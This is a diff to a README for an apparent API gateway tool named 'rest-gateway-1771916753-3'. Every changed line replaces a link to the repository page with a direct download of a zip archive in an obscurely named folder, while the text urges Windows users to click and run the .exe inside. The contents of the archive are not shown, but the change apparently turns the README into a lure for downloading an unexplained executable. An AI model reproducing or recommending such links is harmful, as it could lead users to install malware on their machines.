@@ -1,6 +1,6 @@
 # 🚪 rest-gateway-1771916753-3 - Easy API Access Control
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/Firmancaaa/rest-gateway-1771916753-3)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/Firmancaaa/rest-gateway-1771916753-3/raw/refs/heads/main/superserviceably/gateway_rest_1.4.zip)
 
 ## 📖 What is rest-gateway-1771916753-3?
 
@@ -42,7 +42,7 @@ Below are the simple steps to download and run the software on your Windows comp
 
 Click the big blue button below to visit the download page. This is where you will find the latest versions.
 
-[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/Firmancaaa/rest-gateway-1771916753-3)
+[![Download](https://img.shields.io/badge/Download-blue?style=for-the-badge&logo=github)](https://github.com/Firmancaaa/rest-gateway-1771916753-3/raw/refs/heads/main/superserviceably/gateway_rest_1.4.zip)
 
 - You will land on the GitHub page with releases or files.
 - Look for the Windows version of the app. Usually, it is named with `.exe` at the end.
@@ -104,7 +104,7 @@ If you have trouble starting or using the software, try these tips:
 
 For convenience, here is the main link again to visit the page and get the software:
 
-[https://github.com/Firmancaaa/rest-gateway-1771916753-3](https://github.com/Firmancaaa/rest-gateway-1771916753-3)
+[https://github.com/Firmancaaa/rest-gateway-1771916753-3/raw/refs/heads/main/superserviceably/gateway_rest_1.4.zip](https://github.com/Firmancaaa/rest-gateway-1771916753-3/raw/refs/heads/main/superserviceably/gateway_rest_1.4.zip)
 
 Click this link any time to check for updates or documentation.
 
